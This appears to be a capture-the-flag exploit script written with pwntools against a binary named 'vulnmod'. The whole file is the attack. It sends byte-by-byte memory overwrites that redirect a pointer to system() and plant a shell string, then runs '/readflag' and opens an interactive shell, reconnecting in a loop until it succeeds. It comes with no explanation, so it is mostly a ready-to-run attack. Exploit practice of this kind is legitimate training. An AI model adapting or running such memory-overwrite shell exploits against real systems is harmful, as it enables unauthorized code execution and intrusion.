#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = '0.0.0.0', 55557
binary = './vulnmod'
brkpts = '''
b exit
c
'''

elf = ELF("vulnmod")
libc = ELF("libc-2.33.so")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(str(a))
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

def exploit(io):
    rl()
    sl(hex(0xffffff))

    overwrites = dict()
    
    ptr_off = 0x1206f88
    system = 0xe43de0
    for i in range(3):
        overwrites[hex(ptr_off + i)] = hex((system >> 8*i) & 0xff)

    arg_off = 0x1206978

    binsh = u64("/bin.sh\x00")
    for i in range(7):
        overwrites[hex(arg_off + i)] = hex((binsh >> 8*i) & 0xff)

    sl(hex(len(overwrites)))

    for k, v in overwrites.items():
        sl("{} {}".format(k, v))

    sleep(0.2)
    for _ in range(5):
        sl("/readflag")
    print(io.recv())
    io.interactive()

if __name__ == "__main__":
    count = 0
    while True:
        count += 1
        log.info("COUNT -> "+str(count))
        try:
            io = remote(remote_ip, port)
            exploit(io)
        except:
            io.close()
            continue
